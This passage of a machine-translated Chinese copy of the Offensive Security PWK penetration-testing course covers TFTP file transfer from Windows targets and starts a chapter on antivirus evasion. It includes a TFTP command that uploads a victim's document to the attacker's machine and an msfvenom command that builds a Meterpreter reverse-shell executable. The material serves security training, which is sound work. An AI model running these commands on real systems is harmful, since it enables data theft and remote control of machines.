<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:55021;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">虽然上面显示的基于 Windows 的文件传输方法适用于所有 Windows 版本，因为</font></font></nobr></div>
<div style="position:absolute;top:55040;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Windows 7 和 Windows Server 2008 R2，遇到较旧的可能会遇到问题</font></font></nobr></div>
<div style="position:absolute;top:55059;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">操作系统。</font><font style="vertical-align: inherit;">PowerShell 虽然非常强大且经常使用，但默认情况下并未安装</font></font></nobr></div>
<div style="position:absolute;top:55079;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Windows XP 和 Windows Server 2003 等操作系统，它们仍然存在于某些</font></font></nobr></div>
<div style="position:absolute;top:55098;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">生产网络。</font><font style="vertical-align: inherit;">虽然 VBScript 和 FTP 客户端都存在并且可以工作，但在此</font></font></nobr></div>
<div style="position:absolute;top:55117;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">部分我们将讨论另一种可能在该领域有效的文件传输方法。</font></font></nobr></div>
<div style="position:absolute;top:55150;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">TFTP </font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">400</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">是一种基于 UDP 的文件传输协议，经常受到企业出口防火墙的限制</font></font></nobr></div>
<div style="position:absolute;top:55170;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">规则。</font></font></nobr></div>
<div style="position:absolute;top:55202;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在渗透测试期间，我们可以使用 TFTP 从旧的 Windows 操作系统传输文件</font></font></nobr></div>
<div style="position:absolute;top:55222;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">最高可达 Windows XP 和 2003。这是用于非交互式文件传输的绝佳工具，但它不是</font></font></nobr></div>
<div style="position:absolute;top:55241;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">默认安装在运行 Windows 7、Windows 2008 和更新版本的系统上。</font></font></nobr></div>
<div style="position:absolute;top:55274;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">由于这些原因，TFTP 不是大多数情况下理想的文件传输协议，但在正确的情况下</font></font></nobr></div>
<div style="position:absolute;top:55293;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">情况，它有它的优点。</font></font></nobr></div>
<div style="position:absolute;top:55326;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在我们学习如何使用TFTP传输文件之前，我们首先需要安装和配置一个TFTP服务器</font></font></nobr></div>
<div style="position:absolute;top:55345;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在 Kali 中创建一个目录来存储和提供文件。</font><font style="vertical-align: inherit;">接下来，我们更新目录的所有权</font></font></nobr></div>
<div style="position:absolute;top:55365;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">所以我们可以向它写入文件。</font><font style="vertical-align: inherit;">我们将在 UDP 端口 69 上作为守护进程运行 atftpd 并指示它使用</font></font></nobr></div>
<div style="position:absolute;top:55384;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">新创建的 /tftp 目录：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:55419;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">sudo apt update &amp;&amp; sudo apt install atftp</font></font></font></b></nobr></div>
<div style="position:absolute;top:55436;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">sudo mkdir /tftp</font></font></font></b></nobr></div>
<div style="position:absolute;top:55453;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">sudo chown 没人：/tftp</font></font></font></b></nobr></div>
<div style="position:absolute;top:55470;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">sudo atftpd --daemon --port 69 /tftp</font></font></font></b></nobr></div>
<div style="position:absolute;top:55489;left:330"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 494 - 在 Kali 上设置 TFTP 服务器</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:55518;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在 Windows 系统上，我们将</font><font style="vertical-align: inherit;">使用</font><b><font style="font-size:13px"><font style="vertical-align: inherit;">-i</font></font></b><font style="vertical-align: inherit;">运行</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">tftp</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">客户端</font><font style="vertical-align: inherit;">来指定二进制图像传输，</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"></font></font></b><font style="vertical-align: inherit;"></font></nobr></div>
<div style="position:absolute;top:55538;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们 Kali 系统的 IP 地址，</font><font style="vertical-align: inherit;">启动上传</font><font style="vertical-align: inherit;">的</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">put</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令，最后是文件名</font></font></nobr></div>
<div style="position:absolute;top:55557;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">要上传的文件。</font></font></nobr></div>
<div style="position:absolute;top:55590;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">最后一个命令类似于清单 495 中所示的命令：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:55625;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C:\Users\Offsec&gt; </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">tftp -i 10.11.0.4 put important.docx</font></font></font></b></nobr></div>
<div style="position:absolute;top:55642;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">传输成功：96 秒内 359250 字节，3712 字节/秒</font></font></nobr></div>
<div style="position:absolute;top:55662;left:288"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 495 - 使用 TFTP 将文件上传到我们的 Kali 机器</font></font></i></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:14px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:55720;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">对于使用常见的 Windows 实用程序文件的一些非常有趣的方法</font></font></i></nobr></div>
<div style="position:absolute;top:55739;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">操作、程序执行、UAC 绕过等等，请参阅 Living Off</font></font></i></nobr></div>
<div style="position:absolute;top:55759;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Land Binaries And Scripts (LOLBAS) 项目，</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">401</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">由 Oddvar Moe 维护</font></font></i></nobr></div>
<div style="position:absolute;top:55778;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和一些贡献者，他们的目标是“记录每个二进制文件、脚本和</font></font></i></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:55863;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">400 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（维基百科，2019 年），https://en.wikipedia.org/wiki/Trivial_File_Transfer_Protocol</font></font></font></nobr></div>
<div style="position:absolute;top:55883;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">401 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(LOLBAS-Project, 2019), https://github.com/LOLBAS-Project/LOLBAS</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:56011;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="48"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 48 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:56044;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:57121;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:57121;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:57121;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">489</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:14px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:56140;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">可用于 [这些] 技术的库。” </font><font style="vertical-align: inherit;">例如，certutil.exe </font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">402</font></font></font></i></nobr></div>
<div style="position:absolute;top:56159;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">程序可以轻松下载任意文件等等。</font></font></i></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:56221;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">16.2.5.1 练习</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:56256;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（这些练习不需要报告）</font></font></i></nobr></div>
<div style="position:absolute;top:56289;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1. 使用 VBScript 在非交互式 shell 中将文件从 Kali 传输到 Windows。</font></font></nobr></div>
<div style="position:absolute;top:56317;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2. 使用 PowerShell 在非交互式 shell 中将文件从 Kali 传输到 Windows，反之亦然</font></font></nobr></div>
<div style="position:absolute;top:56336;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">反之。</font></font></nobr></div>
<div style="position:absolute;top:56364;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3. 对于 PowerShell 版本 3 及更高版本，Windows 8.1 和</font></font></nobr></div>
<div style="position:absolute;top:56384;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Windows 10，添加了 cmdlet </font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Invoke-WebRequest </font></font></i><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">403</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">尝试利用它</font></font></nobr></div>
<div style="position:absolute;top:56403;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">对您的 Kali 机器执行上传和下载请求。</font></font></nobr></div>
<div style="position:absolute;top:56432;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">4. 使用 TFTP 将文件从非交互式 shell 从 Kali 传输到 Windows。</font></font></nobr></div>
<div style="position:absolute;top:56465;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">注意：如果遇到问题，请首先尝试在交互式 shell 中进行传输过程，然后</font></font></nobr></div>
<div style="position:absolute;top:56484;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">注意可能导致非交互式 shell 出现问题的问题。</font></font></nobr></div>
</span></font>
<font size="4" color="#0070c0" face="Times"><span style="font-size:22px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:56521;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">16.3 总结</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:56563;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在本模块中，我们专注于开发后文件传输。</font><font style="vertical-align: inherit;">我们了解了传统文件</font></font></nobr></div>
<div style="position:absolute;top:56582;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">FTP、TFTP等传输方式，学习如何升级非交互式shell。</font><font style="vertical-align: inherit;">我们</font></font></nobr></div>
<div style="position:absolute;top:56601;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">还特别关注使用各种脚本的 Windows 特定文件传输方法</font></font></nobr></div>
<div style="position:absolute;top:56621;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">语言以及如何使用</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">exe2hex</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">实用程序传输文件。</font></font></nobr></div>
<div style="position:absolute;top:56654;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们可以在评估期间以各种方式使用这些方法来帮助传输工具或数据</font></font></nobr></div>
<div style="position:absolute;top:56673;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">进入或离开目标网络。</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:57037;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">402 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(api0cradle, 2018), https://github.com/api0cradle/LOLBAS/blob/master/OSBinaries/Certutil.md</font></font></font></nobr></div>
<div style="position:absolute;top:57057;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">403 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（微软，2019 年），https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-</font></font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:57072;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">webrequest?view=powershell-6 </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:57199;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="49"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 49 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:57232;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:58309;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:58309;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:58309;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">490</font></font></nobr></div>
</span></font>
<font size="2" color="#ffffff" face="Times"><span style="font-size:5px;font-family:Times;color:#ffffff">
<div style="position:absolute;top:57322;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">16.3.1.1.1</font></font></nobr></div>
</span></font>
<font size="4" color="#0070c0" face="Times"><span style="font-size:25px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:57348;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">17.防病毒规避</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:57392;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在试图破坏目标机器时，攻击者经常禁用或以其他方式绕过</font></font></nobr></div>
<div style="position:absolute;top:57412;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这些系统上安装了防病毒软件。</font><font style="vertical-align: inherit;">作为渗透测试人员，我们必须理解并成为</font></font></nobr></div>
<div style="position:absolute;top:57431;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">能够模仿这些技术以证明这种潜在威胁。</font></font></nobr></div>
<div style="position:absolute;top:57464;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在本单元中，我们将讨论防病毒软件的用途，并概述它如何部署在</font></font></nobr></div>
<div style="position:absolute;top:57483;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">大多数公司。</font><font style="vertical-align: inherit;">我们将研究用于检测恶意软件的各种方法并探索</font></font></nobr></div>
<div style="position:absolute;top:57503;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">一些可以让我们绕过目标机器上的防病毒软件的可用工具。</font></font></nobr></div>
</span></font>
<font size="4" color="#0070c0" face="Times"><span style="font-size:22px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:57540;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">17.1 什么是杀毒软件</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:57582;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">防病毒 (AV) 是一种旨在防止、检测和删除恶意软件的应用程序。</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">404</font></font></font></nobr></div>
<div style="position:absolute;top:57601;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">它最初旨在简单地删除计算机病毒。</font><font style="vertical-align: inherit;">然而，随着发展</font></font></nobr></div>
<div style="position:absolute;top:57620;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">其他类型的恶意软件，防病毒软件现在通常包括额外的保护，例如</font></font></nobr></div>
<div style="position:absolute;top:57640;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">防火墙、网站扫描仪等。</font></font></nobr></div>
</span></font>
<font size="4" color="#0070c0" face="Times"><span style="font-size:22px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:57677;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">17.2 检测恶意代码的方法</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:57718;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">为了展示各种杀毒产品的有效性，我们将首先扫描一个</font></font></nobr></div>
<div style="position:absolute;top:57738;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">流行的 Meterpreter 有效载荷。</font><font style="vertical-align: inherit;">使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">msfvenom</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，我们将生成一个标准的便携式可执行文件</font></font></nobr></div>
<div style="position:absolute;top:57757;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">包含我们的有效载荷，在这种情况下是一个简单的 TCP 反向 shell。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:14px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:57819;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">便携式可执行文件 (PE) </font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">405</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">文件格式用于 Windows 操作系统</font></font></i></nobr></div>
<div style="position:absolute;top:57839;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">可执行文件和目标文件的系统。</font><font style="vertical-align: inherit;">PE 格式代表一个 Windows</font></font></i></nobr></div>
<div style="position:absolute;top:57858;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">详细说明 Windows 加载程序</font><font style="font-size:8px"><font style="vertical-align: inherit;">406</font></font><font style="vertical-align: inherit;">所需信息的数据结构</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"></font></font></i></nobr></div>
<div style="position:absolute;top:57877;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">管理包装的可执行代码，包括所需的动态库，</font></font></i></nobr></div>
<div style="position:absolute;top:57897;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">API 导入导出表等。</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:57961;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.11.0.4 LPORT=4444 -f</font></font></font></b></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:11px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:57978;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">exe &gt; 二进制.exe</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:57995;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">未选择平台，从有效负载中选择 Msf::Module::Platform::Windows</font></font></nobr></div>
<div style="position:absolute;top:58012;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">未选择 Arch，从有效载荷中选择 Arch: x86</font></font></nobr></div>
<div style="position:absolute;top:58029;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">未指定编码器或 badchars，输出原始负载</font></font></nobr></div>
<div style="position:absolute;top:58046;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">有效载荷大小：333 字节</font></font></nobr></div>
<div style="position:absolute;top:58063;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">exe文件的最终大小：73802字节</font></font></nobr></div>
<div style="position:absolute;top:58082;left:257"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 496 - 生成一个包含 Meterpreter shell 的恶意 PE。</font></font></i></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:58219;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">404 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（维基百科，2019 年），https://en.wikipedia.org/wiki/Antivirus_software</font></font></font></nobr></div>
<div style="position:absolute;top:58239;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">405 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（维基百科，2019 年），https://en.wikipedia.org/wiki/Portable_Executable</font></font></font></nobr></div>
<div style="position:absolute;top:58259;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">406 </font><font style="font-size:9px"><font style="vertical-align: inherit;">（维基百科，2019），https:</font></font><font style="vertical-align: inherit;"> //en.wikipedia.org/wiki/Loader_ </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（计算）</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:58387;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="50"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 50 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:58420;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:59497;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:59497;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:59497;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">491</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:58516;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">接下来，我们将对这个可执行文件运行病毒扫描。</font><font style="vertical-align: inherit;">而不是安装大量杀毒软件</font></font></nobr></div>
<div style="position:absolute;top:58535;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们本地机器上的应用程序，我们可以将我们的文件上传到</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">VirusTotal</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">407</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">它将扫描它</font></font></nobr></div>
<div style="position:absolute;top:58554;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">确定各种AV产品的检出率。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:14px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:58617;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">VirusTotal 很方便，但它为每个独特的提交生成一个哈希值，</font></font></i></nobr></div>
<div style="position:absolute;top:58636;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">然后与所有参与的 AV 供应商共享。</font><font style="vertical-align: inherit;">因此，当</font></font></i></nobr></div>
<div style="position:absolute;top:58655;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">提交敏感的有效负载，因为哈希基本上被认为是公开的</font></font></i></nobr></div>
<div style="position:absolute;top:58675;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第一次提交的时间。</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:58737;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">扫描结果如下：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:59078;left:296"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 263：meterpreter 负载的 Virustotal 结果。</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:59109;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">根据这些结果，我们可以看到许多防病毒产品将我们的文件检测为恶意文件。</font></font></nobr></div>
<div style="position:absolute;top:59129;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在深入研究逃避技术之前，我们必须首先了解防病毒技术</font></font></nobr></div>
<div style="position:absolute;top:59148;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">制造商用来检测恶意代码。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:59182;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">17.2.1</font></font></i></nobr></div>
<div style="position:absolute;top:59182;left:217"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">基于签名的检测</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:59220;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">防病毒签名是恶意软件中唯一标识它的连续字节序列。</font></font></nobr></div>
<div style="position:absolute;top:59240;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">基于签名的防病毒检测通常被认为是一种</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">黑名单技术</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">换句话说，</font></font></nobr></div>
<div style="position:absolute;top:59259;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">扫描文件系统以查找已知的恶意软件签名，如果检测到有问题的文件</font></font></nobr></div>
